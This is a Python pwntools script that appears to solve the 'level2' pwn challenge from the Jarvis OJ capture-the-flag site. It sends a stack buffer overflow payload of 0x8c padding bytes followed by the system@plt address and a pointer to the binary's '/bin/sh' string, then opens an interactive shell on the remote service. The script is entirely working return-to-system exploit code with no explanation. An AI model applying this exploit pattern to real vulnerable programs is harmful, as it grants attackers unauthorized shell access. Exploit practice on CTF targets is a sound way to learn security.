#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'
from pwn import *
#context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
    p = process('./level2.54931449c557d0551c4fc2a10f4778a1')
else:
    p = remote('127.0.0.1',6666)
    p = remote('pwn2.jarvisoj.com',9878)

elf = ELF('./level2.54931449c557d0551c4fc2a10f4778a1')
system_addr = elf.plt['system']
print hex(system_addr)
print hex(elf.symbols['system'])
binsh_addr = next(elf.search('/bin/sh'))
p.recvuntil('Input:')
payload = 'a' * 0x88 + 'a' * 0x4 + p32(system_addr) + p32(1) + p32(binsh_addr)
p.sendline(payload)
p.interactive()

